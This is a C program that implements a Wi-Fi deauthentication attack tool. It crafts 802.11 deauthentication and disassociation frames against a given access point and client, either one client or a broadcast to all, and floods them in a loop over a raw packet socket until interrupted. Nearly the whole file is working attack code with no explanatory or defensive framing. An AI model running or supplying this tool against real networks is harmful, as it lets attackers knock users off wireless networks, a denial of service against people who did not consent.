#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <net/if.h>
#include <arpa/inet.h>

static volatile int running = 1;
static void handler(int s) { (void)s; running = 0; }

static int iface_to_index(const char *iface) {
    struct ifreq ifr;
    memset(&ifr,0,sizeof(ifr));
    strncpy(ifr.ifr_ifrn.ifrn_name, iface, IFNAMSIZ-1);
    int sd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sd < 0) return -1;
    if (ioctl(sd, SIOCGIFINDEX, &ifr) < 0) { close(sd); return -1; }
    close(sd);
    return ifr.ifr_ifindex;
}

static int build_radiotap(uint8_t *buf) {
    buf[0]=0x00; buf[1]=0x00;
    buf[2]=0x0C; buf[3]=0x00;
    buf[4]=0x02; buf[5]=0x00; buf[6]=0x00; buf[7]=0x00;
    buf[8]=0x00; buf[9]=0x00; buf[10]=0x00; buf[11]=0x00;
    return 12;
}

static int build_frame(uint8_t *buf, uint8_t frame_type,
                       const uint8_t *bssid, const uint8_t *station,
                       int reason) {
    int off=0;
    off += build_radiotap(buf+off);
    buf[off++] = frame_type; buf[off++] = 0x00;
    buf[off++] = 0x00; buf[off++] = 0x00;
    memcpy(buf+off, station, 6); off+=6;
    memcpy(buf+off, bssid, 6); off+=6;
    memcpy(buf+off, bssid, 6); off+=6;
    buf[off++] = 0x00; buf[off++] = 0x00;
    buf[off++] = (uint8_t)(reason & 0xFF);
    buf[off++] = (uint8_t)((reason >> 8) & 0xFF);
    return off;
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    if (argc < 4) {
        fprintf(stderr, "Usage: %s <iface> <bssid> <station> [reason]\n", argv[0]);
        return 1;
    }
    char *iface = argv[1];
    unsigned int b[6], s[6];
    sscanf(argv[2], "%x:%x:%x:%x:%x:%x", &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]);
    sscanf(argv[3], "%x:%x:%x:%x:%x:%x", &s[0],&s[1],&s[2],&s[3],&s[4],&s[5]);
    uint8_t bssid[6], station[6];
    for (int i=0;i<6;i++) { bssid[i]=(uint8_t)b[i]; station[i]=(uint8_t)s[i]; }
    int reason = argc > 4 ? atoi(argv[4]) : 3;

    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) { perror("socket"); return 1; }
    int idx = iface_to_index(iface);
    if (idx < 0) { fprintf(stderr,"iface %s not found\n",iface); return 1; }
    struct sockaddr_ll sa;
    memset(&sa,0,sizeof(sa));
    sa.sll_family=AF_PACKET;
    sa.sll_ifindex=idx;
    sa.sll_protocol=htons(ETH_P_ALL);
    if (bind(fd,(struct sockaddr*)&sa,sizeof(sa))<0) { perror("bind"); return 1; }

    signal(SIGINT, handler);
    long total=0;

    uint8_t deauth_fwd[64];
    uint8_t disassoc_fwd[64];
    int len_deauth_fwd = build_frame(deauth_fwd, 0xC0, bssid, station, reason);
    int len_disassoc_fwd = build_frame(disassoc_fwd, 0xA0, bssid, station, reason);

    int targeted = memcmp(station, "\xff\xff\xff\xff\xff\xff", 6) != 0;
    uint8_t deauth_rev[64], disassoc_rev[64];
    int len_deauth_rev = 0, len_disassoc_rev = 0;
    if (targeted) {
        len_deauth_rev = build_frame(deauth_rev, 0xC0, station, bssid, reason);
        len_disassoc_rev = build_frame(disassoc_rev, 0xA0, station, bssid, reason);
    }

    fprintf(stderr, "[DEAUTH] iface=%s bssid=%s station=%s reason=%d targeted=%d\n",
            iface, argv[2], argv[3], reason, targeted);

    while (running) {
        if (send(fd, deauth_fwd, len_deauth_fwd, 0) <= 0)
            fprintf(stderr, "[DEAUTH] send fwd error: %s\n", strerror(errno));
        else total++;

        if (send(fd, disassoc_fwd, len_disassoc_fwd, 0) <= 0)
            fprintf(stderr, "[DEAUTH] send disassoc error: %s\n", strerror(errno));
        else total++;

        if (targeted) {
            if (send(fd, deauth_rev, len_deauth_rev, 0) <= 0)
                fprintf(stderr, "[DEAUTH] send rev error: %s\n", strerror(errno));
            else total++;
            if (send(fd, disassoc_rev, len_disassoc_rev, 0) <= 0)
                fprintf(stderr, "[DEAUTH] send rev dis error: %s\n", strerror(errno));
            else total++;
        }

        if (total % 1500 == 0) {
            printf("[DEAUTH] sent %ld\n", total);
        }
    }

    fprintf(stderr, "\n[DEAUTH] done: %ld total\n", total);
    close(fd);
    return 0;
}
